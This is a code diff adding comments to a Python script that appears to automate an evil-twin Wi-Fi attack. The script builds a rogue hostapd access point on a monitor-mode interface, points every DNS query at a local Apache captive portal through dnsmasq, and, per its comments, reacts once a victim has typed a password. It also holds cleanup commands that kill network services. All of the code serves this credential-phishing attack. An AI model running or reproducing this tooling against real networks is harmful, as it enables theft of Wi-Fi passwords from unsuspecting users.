@@ -11,12 +11,19 @@ console = Console()
 
 
 def progress_bar(unit: int):
+    """
+    Simple progress bar to beutify the outputs, will print relatively to 0.001 seconds
+    """
     with ProgressBar() as pb:
         for _ in pb(range(unit)):
             time.sleep(.01)
 
 
 def cleanup(virtual_iner_name: str):
+    """
+    Post excution cleanup, revert all changes to network tools and configurations
+    This is needed to also prepare a new attack
+    """
     with open('./shell/cleanup.sh', "w") as file:
         file.write(f'#!/bin/sh\n')
         file.write('airmon-ng check kill\n')
@@ -28,17 +35,25 @@ def cleanup(virtual_iner_name: str):
         file.write(f'killall hostapd\n')
         file.write(f'sudo iw dev {virtual_iner_name} interface del\n')
         file.write(f'service NetworkManager restart\n')
-    subprocess.run('bash shell/cleanup.sh')
+    subprocess.run('bash shell/cleanup.sh', check=True, shell=True)
     console.print(f'[bold][yellow]Cleaning up[/][/]')
     progress_bar(400)
 
 
 def set_new_virtual_inet(inet_name: str):
+    """
+    Create a new virtual network interface over the existing monitor one
+    This is required to use the same network device from multiple processess
+    """
     console.print(f'[bold][yellow]Setting new network interface {inet_name + "mon"}[/][/]')
     subprocess.run(f'iw dev {inet_name} interface add {inet_name+"mon"} type monitor', check=True, shell=True)
 
 
 def set_apache_serv():
+    """
+    Sets up the Apache2 web server settings
+    we copy settings from desktop and mobile phones alike
+    """
     console.print(f'[bold][yellow]Setting up Apache2 webserver[/][/]')
     subprocess.run('cat config/apache/000-default.conf > /etc/apache2/sites-available/000-default.conf', check=True, shell=True)
     subprocess.run('cat config/apache/000-default.conf > /etc/apache2/sites-enabled/000-default.conf', check=True, shell=True)
@@ -52,6 +67,10 @@ def set_apache_serv():
 
 
 def set_hostapd_conf(attack_inet: str, ssid: str, channel: str):
+    """
+    Sets hostapd rouge access point setting, the full documentation for each setting 
+    is in the docs folder
+    """
     with open('./config/hostapd.conf', "w") as file:
         file.write(f'interface={attack_inet}\n')
         file.write('driver=nl80211\n')
@@ -63,6 +82,11 @@ def set_hostapd_conf(attack_inet: str, ssid: str, channel: str):
         
 
 def default_dnsmasq_conf(file, attack_inet: str):
+    """
+    This is the default DNS masq conf, it doesn't use locking for a captive portal
+    because this is a setting we are going to change after we detect a user has entered 
+    any password as input
+    """
     file.write(f'interface={attack_inet}\n')
     file.write("dhcp-range=10.100.101.2, 10.100.101.30, 255.255.255.0, 12h\n")
     file.write("dhcp-option=3,10.100.101.1 \n")
@@ -75,6 +99,11 @@ def default_dnsmasq_conf(file, attack_inet: str):
 
 
 def create_dnsconf_captive(attack_inet: str):
+    """
+    Inserts the captive line to the DNSMASQ settings
+    this will force any DNS request to our default gatewaty
+    which is the apache2 servers index.html
+    """
     with open('./config/dns.conf', "w") as file:
         default_dnsmasq_conf(file, attack_inet)
         file.write("address=/#/10.100.101.1")
